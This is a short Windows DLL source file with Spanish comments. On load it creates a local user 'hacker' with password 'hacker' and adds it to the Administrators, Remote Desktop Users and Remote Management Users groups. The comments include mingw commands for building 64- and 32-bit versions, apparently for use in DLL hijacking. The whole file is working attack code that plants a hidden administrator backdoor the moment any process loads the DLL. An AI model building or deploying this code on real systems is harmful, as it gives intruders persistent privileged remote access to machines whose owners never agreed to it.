#include <stdlib.h>
#include <windows.h>

/*
  Crea usuario hacker:hacker y lo añade a administradores y 
  le da acceso RDP y WinRM

  Para compilar
  x86_64-w64-mingw32-gcc -static createUserDLL.cpp --shared -o createUser.dll
  i686-w64-mingw32-gcc -static createUserDLL.cpp --shared -o createUser32.dll
*/


BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
      	    i = system ("net user hacker hacker /add");
            i = system ("net localgroup \"Administrators\" hacker /add");
            i = system ("net localgroup \"Remote Desktop Users\" hacker /add");
            i = system ("net localgroup \"Remote Management Users\" hacker /add");
            break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
        case DLL_THREAD_DETACH: // A thread exits normally.
            break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
    }
    return TRUE;
}